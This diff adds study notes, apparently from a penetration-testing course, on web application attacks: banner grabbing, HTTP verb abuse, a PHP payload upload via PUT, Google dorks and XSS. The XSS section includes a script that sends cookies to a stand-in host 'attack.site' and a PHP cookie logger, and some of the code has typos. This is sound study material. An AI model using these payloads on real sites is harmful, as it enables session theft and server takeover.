@@ -710,3 +710,160 @@
     - Scans by sending probes to systems and applications
     - Compares results to database
   - Can run both on one machine
+
+## 8 Web Application Attacks
+
+### 8.1 Fingerprinting Web Servers
+
+- To fingerprint web server is finding:
+  - Daemon providing the wev server
+  - Version
+  - OS of the machine hosting the server
+
+#### 8.1.2 Fingerprinting with Netcat
+
+- Use as a client and manually send requests to server
+
+- Banner grabbing
+  - Connect to a listening daemon and grab the banner it sends back
+  - *nc [target address] 80*
+  - Netcats connects to server
+  - Hit enter two times
+  - **HEAD/HTTP/1.0**
+
+- Does not work with HTTPS
+
+#### 8.1.3 Fingerpriting with OpenSSL
+
+- Works with HTTPS
+- *opens ssl s_client -connect target.site:443*
+- **HEAD / HTTP/1.0**
+
+#### 8.1.4 Fingerprinting with Httprint
+
+- Signature based fingerprinting
+- Common syntax
+  - *httprint -P0 -h [target hosts] -s [signature file]*
+
+### 8.2 HTTP Verbs
+
+#### 8.2.1 Recap of HTTP verbs
+
+  1. **GET**
+      - Browser can request resources
+        - **GET** */page.php HTTP/1.1*
+      - Can also pass arguments to web app
+        - **GET** */page.php?resource=ITEM* **HTTP/1.1**
+        - **Host:** *www.example.com*
+  2. **POST**
+     - Submit HTML form data in the message body
+  3. **HEAD**
+     - Similar to **GET**, but only asks for header of the response to the response body
+  4. **PUT**
+      - Uploads file to the server
+  5. **DELETE**
+      - Removes a file from the server
+  6. **OPTIONS**
+      - Queries to HTTP server for enabled HTTP verbs
+
+#### 8.2.2 REST APIs
+
+- Web application that strongly rely on HTTP verbs
+- Expect to have subverted functionality
+  - e.g PUT for saving data not saving files
+- Check wether the verbs do what you think they do
+
+### 8.3 Expoliting Misconfigured HTTP Verbs
+
+- First enumerate available methods with an **OPTIONS** message with netcat
+  - *nc victim.site 80*
+  - **OPTIONS** */ HTTP/1.0*
+  - Inspect response **Allow** parameter
+
+#### 8.3.1 Exploiting PUT
+
+- Must know size of payload before upload
+  - Find with *wc -m payload.php*
+
+- Example
+  - *nc vinctim.site 80*
+  ```HTTP
+  PUT /payload.php HTTP/1.0
+  Content-type: text/html
+  Content-length: 20
+
+  <?php phpinfo(); ?>
+  ```
+
+- After uploading the file, pass arguments to the file via cmd GET parameter
+
+### 8.4 Google Hacking
+
+- Advanced google searches to find vulnerable subdomains or files on a site
+- Google Dorks
+- see: https://www.exploit-db.com/google-hacking-database
+
+### 8.5 XSS
+
+- A successfull attack could lead the attacker to:
+  - Modify content of site at runtime
+  - Inject malicous content
+  - Steal cookies
+  - Perform unauthenticated actions
+  - etc...
+
+- Actors involved
+  - A vulnerable website
+  - Victim user
+  - Pentester/hacker
+
+- Happens because of unfiltered user input to build output content
+- User input is any parameter coming from the user
+- All user inputs should be validated because a user input is never to obe trusted
+
+- An attacker exploits a web site by
+  - Making the user browser load malicous content
+  - Performing actions on other users behalf
+  - Stealing their session cookies
+
+#### 8.5.1 Finding XSS
+
+  1. Look at every user input and test if it is somehow displayed to the output of the site(reflection point)
+  2. Check if it possible to inject HTML code and if it ouputs
+      - Try HTML tags < >
+
+#### 8.5.2 Reflected XSS
+
+- Payload is carried inside request that the users browser sends to the webpage
+- Called reflected becauses an input from the user is immediately reflected to the output page
+
+#### 8.5.3 Persistent XSS Attacks
+
+- Payload is sent to the vulnerable site and stored and executed when the page web page pulls the stored content
+- A single attack could exploit multiple users
+- Most common attacks are from HTLM post forms
+- Examples
+  - Display cookie with
+    - `<script> alert(document.cookie)</script>`
+  - Send cookie to attacker-controlled site
+
+    - ```javascript
+      <script>
+      var i = new Image();
+      i.src="http://attack.site/log.php?q="+document.cookie;
+      ```
+
+    - ```php
+      <?php
+      $filename="/tmp/log.txt";
+      $fp=fopen($filname, 'a');
+      $cookie=$_GET['q'];
+      fwrite($fp, $cookie);
+      fclose($fp);
+      ?>  
+      ```
+
+- Hack.me to test yourself
+- Web application hacker's handbook
+
+### 8.6 SQL Injections
